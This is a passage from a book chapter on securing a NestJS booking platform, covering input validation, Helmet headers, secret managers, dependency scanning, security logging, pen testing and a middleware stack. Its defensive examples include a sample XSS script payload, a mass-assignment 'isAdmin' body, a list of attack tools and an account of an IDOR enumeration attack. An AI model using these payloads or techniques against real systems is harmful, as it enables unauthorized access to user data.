// Install: npm install class-validator class-transformer
// main.ts — Global validation pipe
import { ValidationPipe } from '@nestjs/common';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  app.useGlobalPipes(new ValidationPipe({
    whitelist: true,           // Strip properties NOT in the DTO
    forbidNonWhitelisted: true, // REJECT requests with unknown properties
    transform: true,            // Auto-transform payloads to DTO instances
    transformOptions: {
      enableImplicitConversion: true,  // Convert "123" to number 123
    },
    disableErrorMessages: process.env.NODE_ENV === 'production',
    // In production, do not reveal which validation rule failed.
    // The attacker does not need to know your validation logic.
  }));

  await app.listen(3000);
}
```

> **Why `whitelist` and `forbidNonWhitelisted` Matter:** Without these, an attacker can submit `{ "roomId": "abc", "isAdmin": true }` to your booking endpoint. If your code or ORM blindly spreads the payload, they just made themselves an admin. Whitelisting ensures only declared DTO properties are accepted. Everything else is stripped or rejected.

```typescript
// dto/create-booking.dto.ts — Complete validation for booking creation
import {
  IsString, IsUUID, IsDateString, IsOptional,
  IsEnum, MaxLength, MinLength, IsNumber,
  Min, Max, ValidateNested, Matches,
} from 'class-validator';
import { Type } from 'class-transformer';

export class CreateBookingDto {
  @IsUUID('4', { message: 'Room ID must be a valid UUID' })
  roomId: string;

  @IsDateString({}, { message: 'Check-in must be a valid ISO 8601 date' })
  checkIn: string;

  @IsDateString({}, { message: 'Check-out must be a valid ISO 8601 date' })
  checkOut: string;

  @IsNumber()
  @Min(1, { message: 'At least 1 guest is required' })
  @Max(10, { message: 'Maximum 10 guests per booking' })
  guests: number;

  @IsOptional()
  @IsString()
  @MaxLength(500, { message: 'Special requests cannot exceed 500 characters' })
  @Matches(/^[a-zA-Z0-9\s.,!?'"-]*$/, {
    message: 'Special requests contain invalid characters',
  })
  specialRequests?: string;

  @IsOptional()
  @IsEnum(['USD', 'EUR', 'GBP'], {
    message: 'Currency must be USD, EUR, or GBP',
  })
  currency?: string;
}

// What this rejects:
// { roomId: "not-a-uuid" }                    -> Invalid UUID
// { roomId: "abc-123", guests: 0 }            -> Min 1 guest
// { roomId: "abc-123", guests: 500 }          -> Max 10 guests
// { roomId: "abc-123", specialRequests: "<script>alert('xss')</script>" }
//                                              -> Invalid characters
// { roomId: "abc-123", isAdmin: true }         -> Rejected (not whitelisted)
```

> **Checkpoint:** Validation is your innermost wall. Even if an attacker bypasses your WAF and your rate limiter, the validation pipe rejects malformed payloads before they reach your business logic. Pair this with Prisma's type safety and parameterized queries, and you have three independent layers preventing malicious data from reaching your database.

---

## Helmet.js and Security Headers Configuration

HTTP security headers tell the browser how to behave when loading your pages. Without them, browsers use permissive defaults that attackers exploit. Helmet.js sets all the important headers with one middleware.

```typescript
// Install: npm install helmet
import helmet from 'helmet';

// main.ts — Helmet configuration for booking platform
async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  app.use(helmet({
    // Content Security Policy — controls what the browser can load
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],                       // Only load from own origin
        scriptSrc: ["'self'", 'https://js.stripe.com'], // Stripe for payments
        styleSrc: ["'self'", "'unsafe-inline'"],       // Allow inline styles
        imgSrc: ["'self'", 'https://cdn.hotels.com', 'data:'],
        connectSrc: ["'self'", 'https://api.stripe.com'],
        frameSrc: ["'self'", 'https://js.stripe.com'], // Stripe iframe
        fontSrc: ["'self'", 'https://fonts.gstatic.com'],
        objectSrc: ["'none'"],                         // No Flash/Java applets
        baseUri: ["'self'"],                           // Prevent base tag injection
        formAction: ["'self'"],                        // Forms submit only to own origin
      },
    },
    // Strict Transport Security — force HTTPS for 1 year
    hsts: {
      maxAge: 31536000,        // 1 year in seconds
      includeSubDomains: true, // Subdomains too
      preload: true,           // Submit to browser preload lists
    },
    // Prevent clickjacking — your site cannot be embedded in an iframe
    frameguard: { action: 'deny' },
    // Prevent MIME type sniffing
    noSniff: true,
    // Referrer Policy — do not leak URLs to third parties
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    // Remove X-Powered-By header — do not advertise "Express"
    hidePoweredBy: true,
  }));

  await app.listen(3000);
}
```

Each of these headers prevents a specific class of attack:

| Header | What It Prevents | Without It |
|--------|-----------------|------------|
| `Content-Security-Policy` | XSS, data injection, clickjacking | Attacker injects a `<script>` from their server |
| `Strict-Transport-Security` | Protocol downgrade attacks, cookie hijacking | Attacker forces HTTP and reads cookies in transit |
| `X-Frame-Options` | Clickjacking | Attacker embeds your booking page in an invisible iframe |
| `X-Content-Type-Options` | MIME sniffing attacks | Browser executes a `.txt` file as JavaScript |
| `Referrer-Policy` | URL leakage to third parties | Booking IDs leak via `Referer` header to analytics scripts |
| `X-Powered-By` (removed) | Technology fingerprinting | Attacker knows you run Express and targets known exploits |

---

## Secret Management: Never Hardcode, Never Commit

If a password, API key, or certificate appears anywhere in your source code, it will eventually leak. Git history is permanent. Environment variables get logged. `.env` files get committed. Production secret management means using a dedicated, encrypted, access-controlled vault.

### HashiCorp Vault Integration

```typescript
// Install: npm install node-vault
import * as vault from 'node-vault';

@Injectable()
export class VaultSecretManager implements OnModuleInit {
  private client: vault.client;

  async onModuleInit() {
    this.client = vault({
      endpoint: process.env.VAULT_ADDR,  // Only the Vault ADDRESS is in env vars
      token: await this.getVaultToken(), // Token from Kubernetes service account
    });
  }

  private async getVaultToken(): Promise<string> {
    // In Kubernetes, authenticate using the pod's service account
    const jwt = await fs.readFile(
      '/var/run/secrets/kubernetes.io/serviceaccount/token',
      'utf8'
    );
    const result = await vault({ endpoint: process.env.VAULT_ADDR })
      .kubernetesLogin({ role: 'booking-service', jwt });
    return result.auth.client_token;
  }

  async getSecret(path: string): Promise<string> {
    try {
      const result = await this.client.read(`secret/data/${path}`);
      return result.data.data.value;
    } catch (error) {
      this.logger.error(`Failed to retrieve secret: ${path}`, error);
      throw new InternalServerErrorException('Secret retrieval failed');
    }
  }

  // Secrets are rotated automatically — Vault can generate dynamic DB credentials
  async getDatabaseCredentials(): Promise<{ username: string; password: string }> {
    const result = await this.client.read('database/creds/booking-service');
    return {
      username: result.data.username,
      password: result.data.password,
      // These credentials expire after the configured TTL.
      // Vault automatically generates new ones.
    };
  }
}
```

### AWS Secrets Manager Integration

```typescript
// Install: npm install @aws-sdk/client-secrets-manager
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

@Injectable()
export class AwsSecretManager {
  private client: SecretsManagerClient;
  private cache = new Map<string, { value: string; expiresAt: number }>();

  constructor() {
    this.client = new SecretsManagerClient({ region: 'us-east-1' });
  }

  async getSecret(secretName: string): Promise<string> {
    // Check cache first — reduce API calls and latency
    const cached = this.cache.get(secretName);
    if (cached && cached.expiresAt > Date.now()) {
      return cached.value;
    }

    const command = new GetSecretValueCommand({ SecretId: secretName });
    const response = await this.client.send(command);
    const value = response.SecretString;

    // Cache for 5 minutes — balance between freshness and performance
    this.cache.set(secretName, {
      value,
      expiresAt: Date.now() + 5 * 60 * 1000,
    });

    return value;
  }
}

// Usage in database configuration:
const dbPassword = await secretManager.getSecret('booking-db-password');
const stripeKey = await secretManager.getSecret('stripe-secret-key');
// No passwords in code. No passwords in environment variables.
// No passwords in Git history. Ever.
```

---

## Dependency Scanning: npm audit and Snyk Integration

Your application is 20% your code and 80% other people's code. Every dependency is an attack surface. Here is how to systematically find and fix vulnerabilities.

```bash
# Built-in npm audit — run this in CI on every build
npm audit

# Fix automatically where possible
npm audit fix

# Fail the CI build if critical vulnerabilities are found
npm audit --audit-level=critical
```

```json
// package.json — Add audit to your CI scripts
{
  "scripts": {
    "prebuild": "npm audit --audit-level=high",
    "build": "nest build",
    "test": "jest",
    "security:check": "npm audit --audit-level=moderate --json > audit-report.json"
  }
}
```

### Snyk Integration for Continuous Monitoring

```yaml
# .github/workflows/security.yml — GitHub Actions security pipeline
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Every Monday at 6 AM — catch new CVEs

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci

      # npm audit
      - name: Run npm audit
        run: npm audit --audit-level=high

      # Snyk vulnerability scan
      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      # Container image scanning
      - name: Scan Docker image
        uses: snyk/actions/docker@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          image: booking-service:${{ github.sha }}
          args: --severity-threshold=high
```

> **What If You Skip This?** The `event-stream` incident of 2018. A popular npm package with millions of weekly downloads was taken over by a malicious actor who injected code that stole cryptocurrency wallet credentials. The malicious code was buried inside a dependency of a dependency. Teams that ran `npm audit` or used Snyk caught it within hours. Teams that did not were compromised.

---

## Security Logging: Tracking Auth Failures and Suspicious Patterns

You cannot defend against what you cannot see. Security logging is the difference between discovering a breach in minutes and discovering it in months — or never.

### Prisma Schema for Security Events

```prisma
// prisma/schema.prisma — Security event tracking

model SecurityEvent {
  id          String            @id @default(uuid())
  eventType   SecurityEventType
  severity    EventSeverity
  userId      String?           @map("user_id")
  ip          String
  userAgent   String?           @map("user_agent")
  endpoint    String
  method      String            @db.VarChar(10)
  statusCode  Int               @map("status_code")
  details     Json?             // Structured metadata about the event
  requestId   String            @map("request_id")
  createdAt   DateTime          @default(now()) @map("created_at")

  user        User?             @relation(fields: [userId], references: [id])

  @@map("security_events")
  @@index([eventType, createdAt])
  @@index([userId, createdAt])
  @@index([ip, createdAt])
  @@index([severity, createdAt])
}

enum SecurityEventType {
  LOGIN_FAILURE
  LOGIN_SUCCESS
  TOKEN_INVALID
  TOKEN_EXPIRED
  ACCESS_DENIED
  RATE_LIMIT_HIT
  SUSPICIOUS_INPUT
  ACCOUNT_LOCKED
  PASSWORD_RESET
  ADMIN_ACTION
  IP_BLOCKED
  BRUTE_FORCE_DETECTED
}

enum EventSeverity {
  LOW
  MEDIUM
  HIGH
  CRITICAL
}

model BlockedIp {
  id        String   @id @default(uuid())
  ip        String   @unique
  reason    String
  blockedBy String   @map("blocked_by")  // "auto" or admin user ID
  expiresAt DateTime @map("expires_at")
  createdAt DateTime @default(now()) @map("created_at")

  @@map("blocked_ips")
  @@index([ip])
  @@index([expiresAt])
}
```

### Security Logging Service

```typescript
// security/security-logger.service.ts
@Injectable()
export class SecurityLoggerService {
  constructor(private readonly logger: Logger) {}

  async logEvent(event: {
    eventType: SecurityEventType;
    severity: EventSeverity;
    userId?: string;
    ip: string;
    userAgent?: string;
    endpoint: string;
    method: string;
    statusCode: number;
    details?: Record<string, unknown>;
    requestId: string;
  }): Promise<void> {
    // Write to database for analysis and dashboards
    await prisma.securityEvent.create({ data: event });

    // Write to structured log for SIEM ingestion
    this.logger.warn('Security event', {
      ...event,
      timestamp: new Date().toISOString(),
    });

    // Trigger alerts for critical events
    if (event.severity === 'CRITICAL') {
      await this.alertOpsTeam(event);
    }

    // Auto-block IPs that trigger too many security events
    await this.evaluateAutoBlock(event.ip);
  }

  private async evaluateAutoBlock(ip: string): Promise<void> {
    const recentEvents = await prisma.securityEvent.count({
      where: {
        ip,
        severity: { in: ['HIGH', 'CRITICAL'] },
        createdAt: { gte: new Date(Date.now() - 15 * 60 * 1000) },
      },
    });

    if (recentEvents >= 20) {
      await prisma.blockedIp.upsert({
        where: { ip },
        create: {
          ip,
          reason: `Auto-blocked: ${recentEvents} high-severity events in 15 minutes`,
          blockedBy: 'auto',
          expiresAt: new Date(Date.now() + 60 * 60 * 1000), // 1 hour block
        },
        update: {
          expiresAt: new Date(Date.now() + 60 * 60 * 1000),
        },
      });

      this.logger.error(`IP auto-blocked: ${ip}`, {
        reason: 'Excessive high-severity security events',
        eventCount: recentEvents,
      });
    }
  }

  private async alertOpsTeam(event: Record<string, unknown>): Promise<void> {
    // Integration with PagerDuty, Slack, or email
    // Details omitted for brevity — the key point is: critical events
    // must wake someone up. Do not wait for the morning dashboard review.
  }
}
```

### IP Blocking Guard

```typescript
// security/ip-block.guard.ts
@Injectable()
export class IpBlockGuard implements CanActivate {
  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const ip = request.ip;

    const blocked = await prisma.blockedIp.findFirst({
      where: {
        ip,
        expiresAt: { gt: new Date() },
      },
    });

    if (blocked) {
      throw new ForbiddenException('Access denied');
      // Deliberately vague — do not tell the attacker they are blocked
      // or when the block expires
    }

    return true;
  }
}
```

---

## Penetration Testing Approach for Booking Systems

Penetration testing is not something you do once before launch. It is a recurring process. Here is a structured approach tailored to booking platforms.

| Phase | What You Test | Tools | Booking-Specific Focus |
|-------|--------------|-------|----------------------|
| **Reconnaissance** | Exposed endpoints, technology fingerprinting | nmap, whatweb, Wappalyzer | Search for exposed admin panels, debug endpoints, API docs |
| **Authentication** | Login brute-force, session handling, token security | Burp Suite, Hydra | Test booking modification without auth, token reuse after logout |
| **Authorization** | IDOR, privilege escalation, role bypass | Burp Suite Autorize plugin | Can User A view/cancel User B's booking? Can a guest access admin APIs? |
| **Injection** | SQL, XSS, SSRF, command injection | sqlmap, XSS Hunter | Test search fields, review forms, special request inputs, image URLs |
| **Business Logic** | Race conditions, price manipulation, double-booking | Custom scripts | Can two users book the same room at the same time? Can a user modify the price client-side? |
| **API Security** | Rate limiting, mass assignment, excessive data exposure | Postman, OWASP ZAP | Does the booking response include other users' data? Can you enumerate booking IDs? |

> **What If You Skip This?** You might think your code is secure because you followed best practices. But pen testing reveals what code review cannot: the interactions between components, the race conditions, the edge cases where two "secure" systems produce an insecure outcome together. One booking platform discovered during a pen test that their "cancel booking" endpoint could be called twice in rapid succession, triggering two refunds for one booking. The fix was a database lock. The discovery required a pen test.

---

## Full NestJS Security Middleware Stack

Here is the complete middleware stack wired together. The order matters — each layer processes the request before passing it to the next.

```typescript
// main.ts — Production-ready security bootstrap
import { NestFactory } from '@nestjs/core';
import { ValidationPipe } from '@nestjs/common';
import helmet from 'helmet';
import * as compression from 'compression';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule, {
    logger: ['error', 'warn', 'log'],  // No 'debug' or 'verbose' in production
  });

  // Layer 1: Security headers (outermost)
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", 'https://js.stripe.com'],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'https://cdn.hotels.com', 'data:'],
        connectSrc: ["'self'", 'https://api.stripe.com'],
        frameSrc: ["'self'", 'https://js.stripe.com'],
        objectSrc: ["'none'"],
      },
    },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  }));

  // Layer 2: CORS — restrict origins
  app.enableCors({
    origin: ['https://bookings.example.com', 'https://admin.example.com'],
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
    credentials: true,
    maxAge: 3600,
  });

  // Layer 3: Compression (after security headers, before parsing)
  app.use(compression());

  // Layer 4: Body size limits — prevent giant payload attacks
  app.use(express.json({ limit: '1mb' }));
  app.use(express.urlencoded({ extended: true, limit: '1mb' }));

  // Layer 5: Global validation pipe
  app.useGlobalPipes(new ValidationPipe({
    whitelist: true,
    forbidNonWhitelisted: true,
    transform: true,
    disableErrorMessages: process.env.NODE_ENV === 'production',
  }));

  // Layer 6: Global exception filter (no stack traces in production)
  app.useGlobalFilters(new ProductionExceptionFilter(new Logger()));

  // Layer 7: Global guards (IP blocking, rate limiting)
  // These are registered in AppModule via APP_GUARD providers

  const port = process.env.PORT ?? 3000;
  await app.listen(port);
}

bootstrap();
```

```typescript
// app.module.ts — Global guards registration
import { Module } from '@nestjs/common';
import { APP_GUARD } from '@nestjs/core';
import { ThrottlerGuard, ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot([{
      ttl: 60000,    // 1 minute window
      limit: 100,    // 100 requests per minute per IP
    }]),
    // ... other imports
  ],
  providers: [
    // Global rate limiting
    { provide: APP_GUARD, useClass: ThrottlerGuard },
    // Global IP blocking
    { provide: APP_GUARD, useClass: IpBlockGuard },
    // Global JWT verification (zero trust)
    { provide: APP_GUARD, useClass: ZeroTrustGuard },
  ],
})
export class AppModule {}
```

> **The order of middleware matters.** Security headers go first so every response — including error responses — has the right headers. CORS goes next to reject disallowed origins immediately. Validation goes after body parsing so it can inspect the parsed body. Exception filters go last to catch everything and prevent leaking internals.

---

## Production War Story: The Booking System Breach

> **Author's Note:** This story is a composite based on real incidents. Details have been changed to protect the companies involved.

A mid-size hotel chain launched their new booking platform. The development team was experienced. They used HTTPS. They hashed passwords with bcrypt. They used Prisma for database access. By most standards, the application was well-built.

Six months after launch, the security team noticed something odd in the logs. A single IP address was making thousands of requests to the `/api/bookings` endpoint with sequential booking IDs. The endpoint returned 200 for valid bookings and 404 for invalid ones — and it did not check whether the requesting user owned the booking.

**The vulnerability:** A classic IDOR (Insecure Direct Object Reference). The booking IDs were sequential integers, so the attacker simply incremented through them: `/api/bookings/1`, `/api/bookings/2`, `/api/bookings/3`, all the way to `/api/bookings/847293`. For each one, they harvested the guest name, email address, phone number, check-in and check-out dates, room number, and total amount paid.

**The damage:** 847,293 bookings exposed. Guest names, emails, phone numbers, travel dates, and payment amounts all extracted. The attacker sold the data on a dark web forum. The hotel chain faced regulatory fines, class-action lawsuits, and devastating press coverage.

**What should have caught it:**

| Missing Layer | How It Would Have Helped |
|--------------|------------------------|
| Authorization check | `if (booking.userId !== user.id)` — the IDOR would not have worked |
| UUIDs instead of sequential IDs | Attacker cannot guess `a1b2c3d4-e5f6-7890-abcd-ef1234567890` |
| Rate limiting | 10,000 requests per minute from one IP would have triggered throttling |
| Security logging | The pattern of sequential ID access would have triggered an alert |
| IP auto-blocking | After the first 20 unauthorized access attempts, the IP would have been blocked |

**The fix took four hours.** Adding an authorization check (15 minutes), switching to UUID primary keys (1 hour of migration), adding rate limiting (30 minutes), and deploying security logging (2 hours). Four hours of work would have prevented six months of legal proceedings.

> **The Lesson:** Security is not a feature you add later. It is a property of the system that either exists from the start or costs enormously to retrofit. The booking IDs, the missing authorization check, the absent logging — each one was a small decision. Together, they created the breach.

---

## Common Mistakes

> **Mistake 1: "We use HTTPS, so we are secure."**
> HTTPS encrypts data in transit. It does nothing to prevent SQL injection, XSS, IDOR, CSRF, or any application-layer attack. HTTPS is the first layer, not the only layer.

> **Mistake 2: "We validate on the frontend, so we do not need backend validation."**
> Frontend validation is a user experience feature, not a security feature. Any attacker can bypass your frontend entirely by sending requests directly to your API with curl, Postman, or a script. Backend validation is mandatory.

> **Mistake 3: "Our ORM prevents SQL injection, so we never need to think about injection."**
> Prisma prevents SQL injection for standard queries. But `$queryRawUnsafe`, `$executeRawUnsafe`, and any place where you concatenate strings into commands (shell commands, LDAP queries, template engines) are still vulnerable. The principle — never concatenate user input into commands — applies universally.

> **Mistake 4: "We will add security later, after we ship the MVP."**
> Security decisions made at the architecture level (UUID vs. sequential IDs, authorization model, secret management strategy) are enormously expensive to change after deployment. The war story above illustrates this. Build secure from day one.

> **Mistake 5: "We ran a pen test once, so we are covered."**
> Security is not a one-time activity. New vulnerabilities are discovered daily. Your dependencies update. Your codebase changes. Pen tests should run quarterly at minimum, and automated scanning (npm audit, Snyk, OWASP ZAP) should run on every build.

> **Mistake 6: "Security logging slows down the application."**
> An asynchronous write to a security events table adds sub-millisecond latency. The alternative — not knowing you are being attacked — costs infinitely more. Log the events. Alert on the patterns. The performance impact is negligible; the security impact is enormous.

> **Mistake 7: "We store secrets in environment variables, which is fine."**
> Environment variables are better than hardcoded passwords, but they are still visible to anyone who can run `printenv` on the machine, they appear in process listings, they get captured in crash dumps, and they often end up in CI/CD logs. Use a dedicated secret manager (Vault, AWS Secrets Manager) for production.

---

## Chapter Summary

| Topic | Key Takeaway | Implementation |
|-------|-------------|----------------|
| **Defense in Depth** | Layer multiple independent protections; assume each layer will fail | WAF + Helmet + Validation + Auth + RBAC + Encryption + Logging |
| **Least Privilege** | Every component gets minimum permissions needed | Dedicated DB users, scoped Prisma queries, restricted API keys |
| **Zero Trust** | Never trust, always verify — even internal traffic | mTLS between services, JWT validation at every service |
| **OWASP Top 10** | Systematic coverage of real-world attack categories | Mapped each category to specific booking system vulnerabilities |
| **SQL Injection** | Never concatenate user input into queries | Parameterized queries, Prisma ORM, tagged template literals |
| **XSS Prevention** | Sanitize at input AND output, escape HTML in emails | DOMPurify, lodash `escape()`, Content-Security-Policy header |
| **CSRF Protection** | Prevent forged cross-origin requests | CSRF tokens, SameSite cookies, JWT in Authorization header |
| **Input Validation** | Reject everything that is not explicitly allowed | NestJS ValidationPipe, class-validator DTOs, whitelist mode |
| **Security Headers** | Tell the browser how to protect the user | Helmet.js with CSP, HSTS, X-Frame-Options, noSniff |
| **Secret Management** | Never hardcode, never commit, never log secrets | HashiCorp Vault, AWS Secrets Manager, dynamic credentials |
| **Dependency Scanning** | Know what you depend on, keep it updated | npm audit in CI, Snyk continuous monitoring, weekly scans |
| **Security Logging** | You cannot defend against what you cannot see | SecurityEvent model, auto-blocking, SIEM integration, alerts |
| **Penetration Testing** | Test the system as an attacker would | Quarterly pen tests, automated scanning on every build |
| **Middleware Stack** | Order matters — security headers first, exception filter last | Helmet, CORS, compression, body limits, validation, filters, guards |

> **What Comes Next:** In Chapter 28, we turn to **Fraud Detection** — catching the bad guys. You will learn how to build a configurable rules engine, implement velocity checks and geographic anomaly detection, integrate device fingerprinting and 3D Secure, and handle chargebacks. Security keeps attackers out; fraud detection catches the ones who slip through.
